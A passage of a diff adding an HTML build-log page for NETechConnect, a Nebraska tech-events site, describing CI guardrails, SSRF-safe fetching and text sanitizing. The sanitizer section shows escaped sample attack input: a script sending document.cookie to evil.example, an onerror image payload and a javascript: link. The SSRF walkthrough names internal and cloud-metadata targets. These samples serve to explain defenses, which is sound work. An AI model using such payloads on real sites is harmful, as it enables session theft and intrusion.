+    <div class="cards">
+      <div class="card"><span class="tag">discovery/</span><h3>Python on GitHub Actions</h3><p>Scheduled jobs find, clean, classify and de-duplicate events, then build the site.</p></div>
+      <div class="card"><span class="tag">data/</span><h3>Data as files in the repo</h3><p>Events and sources are plain JSON and YAML, so every change is a reviewable diff and git history is the audit log.</p></div>
+      <div class="card"><span class="tag">web/</span><h3>Static site on Cloudflare Pages</h3><p>Plain HTML, CSS and a little JavaScript. No frameworks, no third-party scripts.</p></div>
+      <div class="card"><span class="tag">workers/</span><h3>Two Cloudflare Workers</h3><p>One takes "suggest a group" submissions, the other receives tech newsletters by email.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">How the work is organized</p>
+      <h2>Spec first, then code, one phase at a time</h2>
+      <p class="muted prose">The project uses spec-driven development with Claude Code: decide the rules and the "what" before the "how", then build in small reviewed pull requests.</p>
+    </div>
+    <ol class="chain">
+      <li><b>Constitution</b><span>The seven principles</span></li>
+      <li><b>Spec</b><span>7 user stories, what and why</span></li>
+      <li><b>Plan</b><span>Architecture and research</span></li>
+      <li><b>Tasks</b><span>149 steps across 10 phases</span></li>
+      <li class="here"><b>Build</b><span>Phase by phase, a PR at a time. You are here.</span></li>
+    </ol>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Roadmap</p>
+      <h2>What each phase adds</h2>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Phase</th><th>What it delivers</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr><td class="num">01</td><td><b>Setup.</b> Repo, three projects, automatic checks, branch protection.</td><td><span class="status done">Done</span></td></tr>
+          <tr><td class="num">02</td><td><b>Foundation.</b> Safe fetching, cleaning, data models and storage, time zones, the per-source runner, research checks.</td><td><span class="status now">In progress</span></td></tr>
+          <tr><td class="num">03</td><td><b>Browse upcoming events.</b> The first real site: a list of events from known sources. This is the MVP.</td><td><span class="status next">Next</span></td></tr>
+          <tr><td class="num">04</td><td><b>Find unknown groups.</b> Web search, link-following, newsletters and gap checks discover new organizers.</td><td><span class="status next">Planned</span></td></tr>
+          <tr><td class="num">05</td><td><b>Calendar view.</b> Month and week views of the same events.</td><td><span class="status next">Planned</span></td></tr>
+          <tr><td class="num">06</td><td><b>Filters.</b> By city (Omaha, Lincoln, elsewhere in Nebraska, online) and by topic.</td><td><span class="status next">Planned</span></td></tr>
+          <tr><td class="num">07</td><td><b>Past events.</b> An archive of what already happened.</td><td><span class="status next">Planned</span></td></tr>
+          <tr><td class="num">08</td><td><b>Admin tools.</b> Review new sources, hide or correct events, watch for failing sources.</td><td><span class="status next">Planned</span></td></tr>
+          <tr><td class="num">09</td><td><b>Suggestions.</b> Visitors can suggest a group or event source.</td><td><span class="status next">Planned</span></td></tr>
+          <tr><td class="num">10</td><td><b>Polish and launch.</b> Accessibility, performance and security reviews.</td><td><span class="status next">Planned</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <div class="share">
+      <div class="share-head"><h3>Share the project</h3><button class="btn" type="button" data-copy="post-project">Copy post</button></div>
+      <label class="eyebrow" for="post-project">Suggested post (edit freely)</label>
+      <textarea id="post-project">I'm building NETechConnect: one place to find every community tech event in Nebraska, starting with Omaha and Lincoln.
+
+Meetups, conferences and workshops are scattered across Meetup, Eventbrite, Luma, university calendars and newsletters. NETechConnect finds them automatically every day and links you straight to the organizer's page to register. No accounts, no ads, no personal data.
+
+It's built to run for about $1 a month: Python jobs on GitHub Actions, a static site on Cloudflare. I'm building it in public with Claude Code, one phase at a time.
+
+#Nebraska #OmahaTech #LincolnTech #BuildInPublic</textarea>
+      <span class="count" data-count-for="post-project"></span>
+    </div>
+  </section>
+</div>
+
+<!-- ======================================================= PHASE 1 -->
+<div class="panel" role="tabpanel" id="phase-1" aria-labelledby="tab-phase-1" hidden>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Phase 1 &middot; Setup &middot; merged Oct 17, 2026</p>
+      <h2>Laying the foundation before writing any features</h2>
+    </div>
+    <p class="lede">Phase 1 set up the repository, the three projects that make up NETechConnect, and the safety rails every later change has to pass through. No user-facing features yet, just the ground everything else stands on.</p>
+    <div class="stats">
+      <div class="stat"><span class="n">13</span><p>Setup tasks built and merged in one pull request.</p></div>
+      <div class="stat"><span class="n">4</span><p>Automatic checks that run on every pull request.</p></div>
+      <div class="stat"><span class="n">3</span><p>Projects in one repo: Python discovery, the website, and Cloudflare Workers.</p></div>
+      <div class="stat"><span class="n">0</span><p>Ways to push straight to <code>main</code>. Everything goes through a reviewed PR.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">The repo</p>
+      <h2>Where everything lives</h2>
+    </div>
+    <div class="cards">
+      <div class="card"><span class="tag">discovery/</span><h3>The engine</h3><p>Python package <code>netc</code>. Finds events, cleans them and builds the site. Strict type checking, and tests can't touch the real internet.</p></div>
+      <div class="card"><span class="tag">web/</span><h3>The website's front end</h3><p>Plain JavaScript and CSS. A lint rule bans the risky browser features (<code>eval</code>, <code>innerHTML</code>, <code>document.write</code>).</p></div>
+      <div class="card"><span class="tag">workers/</span><h3>Edge functions</h3><p>TypeScript for Cloudflare: the "suggest a group" form and the newsletter inbox.</p></div>
+      <div class="card"><span class="tag">data/</span><h3>The event data</h3><p>JSON and YAML files: events, sources, the review queue. Empty for now, ready to fill.</p></div>
+      <div class="card"><span class="tag">.github/</span><h3>Automation</h3><p>The CI workflow, Dependabot for updates, and code owners for the sensitive folders.</p></div>
+      <div class="card"><span class="tag">specs/</span><h3>The plan</h3><p>Spec, plan, research and the 149-task list that this log follows.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">The checks</p>
+      <h2>Nothing merges unless every check is green</h2>
+    </div>
+    <figure>
+      <div class="diagram wide">
+        <svg viewBox="0 0 960 250" role="img" aria-label="Every pull request runs four checks in parallel: Python, web, workers, and a secret scan. Branch protection on main allows the merge only when all four pass; otherwise the author fixes the problem and pushes again, which re-runs the checks.">
+          <defs>
+            <marker id="ah2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" class="head"/></marker>
+            <marker id="ah2-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" class="head-accent"/></marker>
+          </defs>
+          <rect class="box" x="16" y="96" width="150" height="58" rx="8"/>
+          <text class="t-title" x="30" y="120">Pull request</text>
+          <text class="t-sub" x="30" y="138">any change, any author</text>
+
+          <rect class="box" x="236" y="16" width="250" height="44" rx="7"/>
+          <text class="t-title" x="250" y="36">Python</text>
+          <text class="t-sub" x="250" y="52">lint &#183; types &#183; tests &#183; pip-audit</text>
+          <rect class="box" x="236" y="72" width="250" height="44" rx="7"/>
+          <text class="t-title" x="250" y="92">Web</text>
+          <text class="t-sub" x="250" y="108">eslint &#183; npm audit</text>
+          <rect class="box" x="236" y="128" width="250" height="44" rx="7"/>
+          <text class="t-title" x="250" y="148">Workers</text>
+          <text class="t-sub" x="250" y="164">typecheck &#183; tests &#183; npm audit</text>
+          <rect class="box" x="236" y="184" width="250" height="44" rx="7"/>
+          <text class="t-title" x="250" y="204">Secret scan</text>
+          <text class="t-sub" x="250" y="220">gitleaks, full history</text>
+
+          <path class="edge" d="M166 125 H200 V38 H234" marker-end="url(#ah2)"/>
+          <path class="edge" d="M200 94 H234" marker-end="url(#ah2)"/>
+          <path class="edge" d="M200 125 V150 H234" marker-end="url(#ah2)"/>
+          <path class="edge" d="M200 150 V206 H234" marker-end="url(#ah2)"/>
+          <text class="t-edge" x="200" y="246" text-anchor="middle">run in parallel</text>
+
+          <path class="edge" d="M486 38 H530 V125" />
+          <path class="edge" d="M486 94 H530" />
+          <path class="edge" d="M486 150 H530" />
+          <path class="edge" d="M486 206 H530 V125 H560" marker-end="url(#ah2)"/>
+
+          <rect class="box-2" x="562" y="96" width="170" height="58" rx="8"/>
+          <text class="t-title" x="576" y="120">Branch protection</text>
+          <text class="t-sub" x="576" y="138">all four green?</text>
+
+          <line class="edge-accent" x1="732" y1="125" x2="796" y2="125" marker-end="url(#ah2-ok)"/>
+          <text class="t-accent" x="764" y="117" text-anchor="middle">yes</text>
+          <rect class="box-ok" x="798" y="96" width="146" height="58" rx="8"/>
+          <text class="t-title" x="812" y="120">Merge to main</text>
+          <text class="t-sub" x="812" y="138">site data updates</text>
+
+          <path class="edge-dash" d="M647 154 V238 H91 V156" marker-end="url(#ah2)"/>
+          <text class="t-edge" x="655" y="196">no: fix and push again</text>
+        </svg>
+      </div>
+      <figcaption>The same four checks guard every change, whether I write it, Claude Code writes it, or (later) the discovery bot proposes new event data. Branch protection on <code>main</code> turns the results into a hard gate.</figcaption>
+    </figure>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Safety rails</p>
+      <h2>Guardrails for a public repository</h2>
+    </div>
+    <div class="cards">
+      <div class="card"><h3>Pinned automation</h3><p>Every GitHub Action is locked to an exact commit, so a hijacked tool can't slip new code into CI.</p></div>
+      <div class="card"><h3>Read-only by default</h3><p>CI jobs can read the code but can't push, merge or change settings.</p></div>
+      <div class="card"><h3>The 14-day rule</h3><p>New library versions are only used once they're at least two weeks old, when bad releases have usually been caught.</p></div>
+      <div class="card"><h3>Dependabot</h3><p>Proposes updates every week, waits out the 14 days, and still delivers security fixes immediately.</p></div>
+      <div class="card"><h3>Offline tests</h3><p>Any test that tries to open a real network connection fails. Every web response in tests is recorded or faked.</p></div>
+      <div class="card"><h3>Secret scanning</h3><p>gitleaks checks every commit for keys and passwords before they could reach <code>main</code>.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Along the way</p>
+      <h2>What actually happened</h2>
+    </div>
+    <div class="notes">
+      <div class="note hi"><div><h3>A vulnerability hiding two layers deep</h3><p>The security audit flagged high-severity issues in Cloudflare's test tooling. The flaw wasn't in anything I chose directly; it was in two libraries that tooling depends on. Even the newest version still pulled them in, so I pinned the patched versions with npm overrides and the audit went to zero.</p></div></div>
+      <div class="note"><div><h3>Applying the 14-day rule everywhere</h3><p>The Python side already refused releases younger than 14 days. I applied the same rule to npm packages and GitHub Actions, and later taught Dependabot to wait too.</p></div></div>
+      <div class="note"><div><h3>The merge that didn't</h3><p>The first PR looked merged but wasn't: GitHub's merge needs a second "Confirm merge" click. Checking the actual state of <code>main</code>, instead of assuming, caught it.</p></div></div>
+      <div class="note"><div><h3>Dependabot's first five PRs</h3><p>Four were fine. One, vitest 5, broke the Workers tests because Cloudflare's plugin only supports vitest 4. Closed it and told Dependabot to skip that major version for now.</p></div></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="share">
+      <div class="share-head"><h3>Share Phase 1</h3><button class="btn" type="button" data-copy="post-phase-1">Copy post</button></div>
+      <label class="eyebrow" for="post-phase-1">Suggested post (edit freely)</label>
+      <textarea id="post-phase-1">NETechConnect build log, Phase 1: the foundation is in.
+
+No features yet, just the ground everything stands on:
+- 3 projects in one repo: Python discovery, the website, Cloudflare Workers
+- 4 automatic checks on every pull request: lint, type checks, tests, dependency audits and a secret scan
+- main is protected, so nothing merges unless every check is green
+- new library versions wait 14 days before I use them
+
+Lesson of the week: a "high severity" warning was hiding two layers deep inside Cloudflare's test tooling. Pinned the patched versions and the audit went to zero.
+
+Next up: teaching the bot to browse the web safely.
+
+#BuildInPublic #Nebraska #OmahaTech</textarea>
+      <span class="count" data-count-for="post-phase-1"></span>
+    </div>
+  </section>
+</div>
+
+<!-- ======================================================= PHASE 2 -->
+<div class="panel" role="tabpanel" id="phase-2" aria-labelledby="tab-phase-2" hidden>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Phase 2 &middot; Foundation &middot; started Oct 17, 2026</p>
+      <h2>The building blocks every feature relies on</h2>
+    </div>
+    <p class="lede">Before the site can show a single event, the discovery bot needs to read the web without being tricked, clean what it reads, and store it reliably. Phase 2 builds those pieces. Nothing visible yet; everything after depends on it.</p>
+    <div class="stats">
+      <div class="stat"><span class="n">7<small> of 27</small></span><p>Tasks done so far in this phase.</p></div>
+      <div class="stat"><span class="n">261</span><p>Automated tests, all passing, running in about 2 seconds.</p></div>
+      <div class="stat"><span class="n">~8,000&times;</span><p>Speed-up from fixing one slow pattern found by attacking my own code.</p></div>
+    </div>
+    <ul class="checklist">
+      <li class="done"><span class="mark" aria-hidden="true">&#10003;</span><div><b>Safe fetching</b><small>The one gate for all web access. Merged in PR #7.</small></div><span class="ids">T019&ndash;T023</span></li>
+      <li class="done"><span class="mark" aria-hidden="true">&#10003;</span><div><b>Cleaning untrusted text</b><small>Plain text, safe links, no personal contact details. Built, PR pending.</small></div><span class="ids">T024&ndash;T025</span></li>
+      <li><span class="mark" aria-hidden="true"></span><div><b>Data models, schemas and storage</b><small>What an event is, and how it's saved as files.</small></div><span class="ids">T026&ndash;T032</span></li>
+      <li><span class="mark" aria-hidden="true"></span><div><b>Time zones and categories</b><small>Central Time done right, topic and city lists.</small></div><span class="ids">T033&ndash;T036</span></li>
+      <li><span class="mark" aria-hidden="true"></span><div><b>Per-source runner</b><small>One broken source never stops the rest.</small></div><span class="ids">T037&ndash;T038</span></li>
+      <li><span class="mark" aria-hidden="true"></span><div><b>Research checks</b><small>Terms, prices and limits for Meetup, Luma, Eventbrite, OpenAI, Brave Search and Cloudflare.</small></div><span class="ids">T039&ndash;T045</span></li>
+    </ul>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Part 1 &middot; Safe fetching</p>
+      <h2>Every request the bot makes goes through one gate</h2>
+      <p class="muted prose">A bot that visits links found on the internet can be tricked into visiting places it shouldn't, like servers inside the network it runs on. This attack is called server-side request forgery (SSRF). Pick a scenario to see where each request gets stopped.</p>
+    </div>
+    <div class="walk">
+      <div class="scenarios" role="group" aria-label="Request scenarios">
+        <button class="chip" type="button" data-scenario="normal" aria-pressed="true">A normal event page</button>
+        <button class="chip" type="button" data-scenario="localhost" aria-pressed="false">A link to localhost</button>
+        <button class="chip" type="button" data-scenario="rebind" aria-pressed="false">A name that points inside</button>
+        <button class="chip" type="button" data-scenario="redirect" aria-pressed="false">A sneaky redirect</button>
+        <button class="chip" type="button" data-scenario="robots" aria-pressed="false">A site that says no bots</button>
+        <button class="chip" type="button" data-scenario="endless" aria-pressed="false">An endless download</button>
+      </div>
+      <figure>
+        <div class="diagram wide">
+          <svg id="flow" viewBox="0 0 1000 236" role="img" aria-label="Request pipeline: check the link, look up the IP address, read robots.txt, pace the request, connect to the checked IP, download within limits, then deliver. Any failed check sends the request to Refused. A redirect starts over at the link check, at most five times.">
+            <defs>
+              <marker id="ah3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" class="head"/></marker>
+            </defs>
+            <path id="e-redirect" class="redirect" d="M780 46 V24 H80 V42" marker-end="url(#ah3)"/>
+            <text class="t-edge" x="430" y="17" text-anchor="middle">redirect: start over from the top (5 at most)</text>
+
+            <g class="node" id="s-url"><rect x="21" y="46" width="118" height="64" rx="8"/><text class="t-title" x="80" y="73" text-anchor="middle">Check link</text><text class="t-sub" x="80" y="92" text-anchor="middle">https &#183; port 443</text></g>
+            <g class="node" id="s-dns"><rect x="161" y="46" width="118" height="64" rx="8"/><text class="t-title" x="220" y="73" text-anchor="middle">Look up IP</text><text class="t-sub" x="220" y="92" text-anchor="middle">public only</text></g>
+            <g class="node" id="s-robots"><rect x="301" y="46" width="118" height="64" rx="8"/><text class="t-title" x="360" y="73" text-anchor="middle">robots.txt</text><text class="t-sub" x="360" y="92" text-anchor="middle">bot allowed?</text></g>
+            <g class="node" id="s-wait"><rect x="441" y="46" width="118" height="64" rx="8"/><text class="t-title" x="500" y="73" text-anchor="middle">Pace</text><text class="t-sub" x="500" y="92" text-anchor="middle">5 s gap &#183; budget</text></g>
+            <g class="node" id="s-connect"><rect x="581" y="46" width="118" height="64" rx="8"/><text class="t-title" x="640" y="73" text-anchor="middle">Connect</text><text class="t-sub" x="640" y="92" text-anchor="middle">to the checked IP</text></g>
+            <g class="node" id="s-limits"><rect x="721" y="46" width="118" height="64" rx="8"/><text class="t-title" x="780" y="73" text-anchor="middle">Download</text><text class="t-sub" x="780" y="92" text-anchor="middle">time &#183; size &#183; type</text></g>
+            <g class="node" id="s-done"><rect x="861" y="46" width="118" height="64" rx="8"/><text class="t-title" x="920" y="73" text-anchor="middle">Delivered</text><text class="t-sub" x="920" y="92" text-anchor="middle">ready to read</text></g>
+
+            <line class="edge" x1="139" y1="78" x2="159" y2="78" marker-end="url(#ah3)"/>
+            <line class="edge" x1="279" y1="78" x2="299" y2="78" marker-end="url(#ah3)"/>
+            <line class="edge" x1="419" y1="78" x2="439" y2="78" marker-end="url(#ah3)"/>
+            <line class="edge" x1="559" y1="78" x2="579" y2="78" marker-end="url(#ah3)"/>
+            <line class="edge" x1="699" y1="78" x2="719" y2="78" marker-end="url(#ah3)"/>
+            <line class="edge" x1="839" y1="78" x2="859" y2="78" marker-end="url(#ah3)"/>
+
+            <line class="edge-dash" x1="80" y1="110" x2="80" y2="174"/>
+            <line class="edge-dash" x1="220" y1="110" x2="220" y2="174"/>
+            <line class="edge-dash" x1="360" y1="110" x2="360" y2="174"/>
+            <line class="edge-dash" x1="500" y1="110" x2="500" y2="174"/>
+            <line class="edge-dash" x1="640" y1="110" x2="640" y2="174"/>
+            <line class="edge-dash" x1="780" y1="110" x2="780" y2="174"/>
+            <text class="t-edge" x="88" y="146">no</text>
+            <text class="t-edge" x="228" y="146">no</text>
+            <text class="t-edge" x="368" y="146">no</text>
+            <text class="t-edge" x="508" y="146">no</text>
+            <text class="t-edge" x="648" y="146">no</text>
+            <text class="t-edge" x="788" y="146">no</text>
+
+            <g class="refused" id="s-refused"><rect x="21" y="176" width="818" height="44" rx="8"/><text class="t-title" x="430" y="203" text-anchor="middle">Refused: nothing is downloaded, the run moves on to the next source</text></g>
+          </svg>
+        </div>
+        <figcaption>Each request, and each hop of a redirect, passes every check in order. The bot connects to the exact address it checked, so a hostname can't switch to an internal address between the check and the connection.</figcaption>
+      </figure>
+      <div class="verdict" id="verdict" aria-live="polite"></div>
+      <ol class="steps" id="steps"></ol>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Never reachable</p>
+      <h2>Addresses the bot refuses to visit</h2>
+      <p class="muted prose">If a website's name resolves to any of these, the request stops before a connection is made. Each range has its own automated test, including disguised forms such as IPv6 wrappers around a private address.</p>
+    </div>
+    <div class="ranges">
+      <span>10.0.0.0/8</span><span>172.16.0.0/12</span><span>192.168.0.0/16</span><span>127.0.0.0/8 loopback</span><span>169.254.169.254 cloud metadata</span><span>100.64.0.0/10 carrier NAT</span><span>224.0.0.0/4 multicast</span><span>0.0.0.0</span><span>::1</span><span>fc00::/7</span><span>fe80::/10</span><span>::ffff:10.x mapped</span><span>64:ff9b:: NAT64</span><span>localhost</span><span>raw IP links</span>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Part 2 &middot; Cleaning untrusted text</p>
+      <h2>Whatever a page contains, only plain words get stored</h2>
+      <p class="muted prose">Event descriptions come from sites I don't control. Before anything is saved, it's stripped to plain text, so nothing a source writes can run in a visitor's browser.</p>
+    </div>
+    <figure>
+      <div class="ba">
+        <div style="display:grid;gap:8px;min-width:0">
+          <span class="code-lbl">What a hostile page could send</span>
+<pre class="code">&lt;h1&gt;Omaha&amp;nbsp;Python Meetup&lt;/h1&gt;
+<span class="danger">&lt;script&gt;document.location='https://evil.example/?c='
+  +document.cookie&lt;/script&gt;</span>
+&lt;p&gt;Join us for &lt;b&gt;lightning talks&lt;/b&gt; &amp;amp; pizza!&lt;/p&gt;
+<span class="danger">&lt;img src="x" onerror="alert('img')"&gt;</span>
+&lt;a href="<span class="danger">javascript:alert('link')</span>"&gt;Register&lt;/a&gt;
+&lt;p&gt;<span class="danger">&amp;lt;script&amp;gt;alert('sneaky')&amp;lt;/script&amp;gt;</span>Doors at 6pm.&lt;/p&gt;</pre>
+        </div>
+        <span class="arrow" aria-hidden="true">&rarr;</span>
+        <div class="result">
+          <span class="lbl">What gets stored</span>
+          <p>Omaha Python Meetup Join us for lightning talks &amp; pizza! Register Doors at 6pm.</p>
+          <span class="lbl" style="margin-top:6px">Gone</span>
+          <p class="muted" style="font-size:0.9rem">The cookie-stealing script, the image trap, the <code>javascript:</code> link, and the "escaped" script that would have turned back into a real one after decoding.</p>
+        </div>
+      </div>
+      <figcaption>Real input and real output from the project's tests. The page is shown escaped here, so none of it runs.</figcaption>
+    </figure>
+    <div class="two">
+      <div style="display:grid;gap:8px;min-width:0">
+        <h3>Links: only safe web addresses survive</h3>
+        <div class="table-wrap">
+          <table class="mini">
+            <tr><td>javascript:alert(1)</td><td class="drop">dropped</td></tr>
+            <tr><td>http://example.com/event</td><td class="drop">dropped (not https)</td></tr>
+            <tr><td>https://192.168.0.1/</td><td class="drop">dropped (raw IP)</td></tr>
+            <tr><td>HTTPS://Meetup.COM/omaha-python/</td><td class="keep">kept as https://meetup.com/omaha-python/</td></tr>
+          </table>
+        </div>
+      </div>
+      <div style="display:grid;gap:8px;min-width:0">
+        <h3>Notes: contact details are removed</h3>
+        <div class="table-wrap">
+          <table class="mini">
+            <tr><td>Questions? Email jane.doe@example.com or call (402) 555-0199. Doors open 6:30 PM, Room 1200.</td></tr>
+            <tr><td><span class="keep">&rarr;</span> Questions? Email or call . Doors open 6:30 PM, Room 1200.</td></tr>
+          </table>
+        </div>
+        <p class="muted" style="font-size:0.88rem">Times, dates, room numbers, ZIP codes and prices are left alone.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Along the way</p>
+      <h2>Attacking my own code found a real bug</h2>
+    </div>
+    <div class="speed">
+      <div><span class="big before">127 s</span><span class="cap">before the fix</span></div>
+      <div><span class="big after">0.015 s</span><span class="cap">after the fix</span></div>
+      <p>All the planned tests passed, so I fed the cleaner extra junk on purpose. A string of 300,000 unclosed <code>&lt;div</code> tags took over two minutes, enough for a hostile page to stall a discovery run. The cause was a text pattern I'd written myself. Handing the job to a real HTML parser fixed it, and that input is now a permanent test.</p>
+    </div>
+    <figure>
+      <div class="chart-box">
+        <svg id="tests-chart" viewBox="0 0 640 260" role="img" aria-label="Automated tests: 2 after Phase 1, 143 after safe fetching, 261 after cleaning untrusted text.">
+          <line class="grid" x1="56" y1="210" x2="620" y2="210"/>
+          <line class="grid" x1="56" y1="150" x2="620" y2="150"/>
+          <line class="grid" x1="56" y1="90" x2="620" y2="90"/>
+          <line class="grid" x1="56" y1="30" x2="620" y2="30"/>
+          <text class="axis" x="46" y="214" text-anchor="end">0</text>
+          <text class="axis" x="46" y="154" text-anchor="end">100</text>
+          <text class="axis" x="46" y="94" text-anchor="end">200</text>
+          <text class="axis" x="46" y="34" text-anchor="end">300</text>
+          <!-- scale: 0.6 px per test, baseline y=210 -->
+          <g data-tip="End of Phase 1: 2 tests">
+            <rect class="bar-hit" x="100" y="20" width="120" height="190"/>
+            <path class="bar" d="M128 210 V208.8 a1.2 1.2 0 0 1 1.2 -1.2 H190.8 a1.2 1.2 0 0 1 1.2 1.2 V210 Z"/>
+            <text class="val" x="160" y="199" text-anchor="middle">2</text>
+            <text class="axis" x="160" y="232" text-anchor="middle">End of Phase 1</text>
+          </g>
+          <g data-tip="After safe fetching: 143 tests">
+            <rect class="bar-hit" x="278" y="20" width="120" height="190"/>
+            <path class="bar" d="M306 210 V128.2 a4 4 0 0 1 4 -4 H364 a4 4 0 0 1 4 4 V210 Z"/>
+            <text class="val" x="338" y="116" text-anchor="middle">143</text>
+            <text class="axis" x="338" y="232" text-anchor="middle">+ Safe fetching</text>
+          </g>
+          <g data-tip="After cleaning untrusted text: 261 tests">
+            <rect class="bar-hit" x="456" y="20" width="120" height="190"/>
+            <path class="bar" d="M484 210 V57.4 a4 4 0 0 1 4 -4 H542 a4 4 0 0 1 4 4 V210 Z"/>
+            <text class="val" x="516" y="45" text-anchor="middle">261</text>
+            <text class="axis" x="516" y="232" text-anchor="middle">+ Cleaning text</text>
+          </g>
+        </svg>
+        <div class="tip" id="tip" hidden></div>
+      </div>
+      <figcaption>Automated tests in the project, all passing. Tests are written before the code they check, so the count climbs with every part of the build.</figcaption>
+      <details class="data">
+        <summary>Show as a table</summary>
+        <div class="table-wrap"><table>
+          <thead><tr><th>Milestone</th><th>Tests</th></tr></thead>
+          <tbody><tr><td>End of Phase 1</td><td>2</td></tr><tr><td>+ Safe fetching</td><td>143</td></tr><tr><td>+ Cleaning text</td><td>261</td></tr></tbody>
+        </table></div>
+      </details>
+    </figure>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">Coming next in Phase 2</p>
+      <h2>Models, storage and the runner</h2>
+    </div>
+    <div class="cards">
+      <div class="card"><span class="tag">T026&ndash;T032</span><h3>What an event is</h3><p>Exact rules for every field, saved as tidy files so each daily change is a readable diff, plus a <code>netc validate-data</code> check in CI.</p></div>
+      <div class="card"><span class="tag">T033&ndash;T036</span><h3>Time and place</h3><p>Central Time across daylight saving changes, and which towns count as Omaha, Lincoln or elsewhere in Nebraska.</p></div>
+      <div class="card"><span class="tag">T037&ndash;T038</span><h3>One bad source can't stop the run</h3><p>Failures are recorded and the rest of the sources carry on.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="share">
+      <div class="share-head"><h3>Share Phase 2 so far</h3><button class="btn" type="button" data-copy="post-phase-2">Copy post</button></div>
+      <label class="eyebrow" for="post-phase-2">Suggested post (edit freely)</label>
+      <textarea id="post-phase-2">NETechConnect build log, Phase 2 (part 1): teaching a bot to read the web safely.
+
+Every page the discovery bot visits now goes through one gate:
+- https only, and never an internal or private address, checked again on every redirect
+- robots.txt respected, 5 seconds between requests to the same site
+- hard limits on time, size and file type
+
+Then everything it collects is cleaned to plain text before it's stored, so nothing a source writes can run in your browser.
+
+Favorite moment: after all the planned tests passed, I threw junk at my own code. One input took 127 seconds to clean. One fix later: 0.015 s, and it's a permanent test now.
+
+261 tests and counting.
+
+#BuildInPublic #AppSec #Nebraska #OmahaTech</textarea>
+      <span class="count" data-count-for="post-phase-2"></span>
+    </div>
+  </section>
+</div>
+</main>
+
+<footer class="foot">
+  <span>NETechConnect build log &middot; updated Oct 17, 2026</span>
+  <span>Built in public with Claude Code</span>
+</footer>
+</div>
+
+<script>
+(() => {
+  /* ---------- Tabs with deep links (#project, #phase-1, #phase-2) ---------- */
+  const tabs = Array.from(document.querySelectorAll('[role="tab"]'));
+  const panels = tabs.map(t => document.getElementById(t.getAttribute('aria-controls')));
+
+  function select(id, focus) {
+    tabs.forEach((t, i) => {
+      const on = t.getAttribute('aria-controls') === id;
+      t.setAttribute('aria-selected', String(on));
+      t.tabIndex = on ? 0 : -1;
+      panels[i].hidden = !on;
+      if (on && focus) t.focus();
+    });
+    try { history.replaceState(null, '', '#' + id); } catch (e) { /* sandboxed */ }
+  }
+  tabs.forEach((t, i) => {
+    t.addEventListener('click', () => select(t.getAttribute('aria-controls'), false));
+    t.addEventListener('keydown', e => {
+      let j = null;
+      if (e.key === 'ArrowRight') j = (i + 1) % tabs.length;
+      if (e.key === 'ArrowLeft') j = (i - 1 + tabs.length) % tabs.length;
+      if (e.key === 'Home') j = 0;
+      if (e.key === 'End') j = tabs.length - 1;
+      if (j !== null) { e.preventDefault(); select(tabs[j].getAttribute('aria-controls'), true); }
+    });
+  });
+  const start = (location.hash || '').slice(1);
+  if (panels.some(p => p.id === start)) select(start, false);
+
+  /* ---------- Request walkthrough ---------- */
+  const order = ['s-url', 's-dns', 's-robots', 's-wait', 's-connect', 's-limits', 's-done'];
+  const S = {
+    normal: {
+      ok: true, verdict: 'Delivered. All six checks passed and the page is handed to the parser.',
+      steps: [
+        ['s-url', 'pass', 'https://www.meetup.com/omaha-python/events/ is https on port 443 with a real hostname.'],
+        ['s-dns', 'pass', 'The name resolves to public internet addresses only.'],
+        ['s-robots', 'pass', "robots.txt allows NETechConnectBot on this path."],
+        ['s-wait', 'pass', 'At least 5 seconds since the last request to this site, and within its budget for the run.'],
+        ['s-connect', 'pass', 'Connects to the exact IP address it just checked.'],
+        ['s-limits', 'pass', 'HTML page, 180 KB, finished in under a second: well inside 5 MB and 30 seconds.'],
+        ['s-done', 'pass', 'Page text goes on to be cleaned and parsed.']
+      ]
+    },
+    localhost: {
+      ok: false, verdict: 'Refused at the first check. Nothing was looked up or downloaded.',
+      steps: [['s-url', 'fail', 'https://localhost/admin points at the machine running the bot. localhost is never allowed.']]
+    },
+    rebind: {
+      ok: false, verdict: 'Refused before connecting. The name looked public, but its address is private.',
+      steps: [
+        ['s-url', 'pass', 'https://events.example.com/ looks like an ordinary website.'],
+        ['s-dns', 'fail', 'Its DNS answer is 10.0.0.5, a private address inside a network. Refused before any connection.']
+      ]
+    },
+    redirect: {
+      ok: false, redirect: true, verdict: 'Refused on the second pass. The redirect pointed at the cloud metadata address.',
+      steps: [
+        ['s-url', 'pass', 'https://example-events.org/next is a normal-looking link.'],
+        ['s-dns', 'pass', 'It resolves to a public address.'],
+        ['s-robots', 'pass', 'robots.txt allows it.'],
+        ['s-wait', 'pass', 'Paced as usual.'],
+        ['s-connect', 'pass', 'Connects to the checked IP.'],
+        ['s-limits', 'redirect', 'The server answers "302 Found" pointing to https://169.254.169.254/latest/meta-data/. Start over with the new link.'],
